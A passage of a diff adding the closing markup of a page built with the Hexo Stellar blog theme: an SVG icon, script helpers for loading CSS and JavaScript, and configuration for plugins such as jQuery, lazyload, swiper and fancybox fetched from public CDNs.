+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  const stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = stellar.config.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.version = '1.19.0';
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.19.0';
+  stellar.config = {
+    date_suffix: {
+      just: '刚刚',
+      min: '分钟前',
+      hour: '小时前',
+      day: '天前',
+      month: '个月前',
+    },
+    root : '/',
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://gcore.jsdelivr.net/npm/jquery@3.6.2/dist/jquery.min.js'
+  };
+
+  if ('local_search') {
+    stellar.search = {};
+    stellar.search.service = 'local_search';
+    if (stellar.search.service == 'local_search') {
+      let service_obj = Object.assign({}, {"field":"all","path":"/search.json","content":true,"sort":"-date"});
+      stellar.search[stellar.search.service] = service_obj;
+    }
+  }
+
+  // stellar js
+  stellar.plugins.stellar = Object.assign({"sites":"/js/plugins/sites.js","friends":"/js/plugins/friends.js","ghinfo":"/js/plugins/ghinfo.js","timeline":"/js/plugins/timeline.js","linkcard":"/js/plugins/linkcard.js","fcircle":"/js/plugins/fcircle.js","weibo":"/js/plugins/weibo.js"});
+
+  stellar.plugins.marked = Object.assign("https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js");
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://gcore.jsdelivr.net/npm/vanilla-lazyload@17.8.3/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@8.4.5/swiper-bundle.min.css","js":"https://unpkg.com/swiper@8.4.5/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://gcore.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://gcore.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://gcore.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.fancybox = Object.assign({"enable":true,"js":"https://gcore.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js","css":"https://gcore.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css","selector":".swiper-slide img"});
+  }
+  if ('false' == 'true') {
+    stellar.plugins.heti = Object.assign({"enable":false,"css":"https://unpkg.com/heti@0.9.2/umd/heti.min.css","js":"https://unpkg.com/heti@0.9.2/umd/heti-addon.min.js"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.copycode = Object.assign({"enable":true,"js":"/js/plugins/copycode.js","default_text":"Copy","success_text":"Copied"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
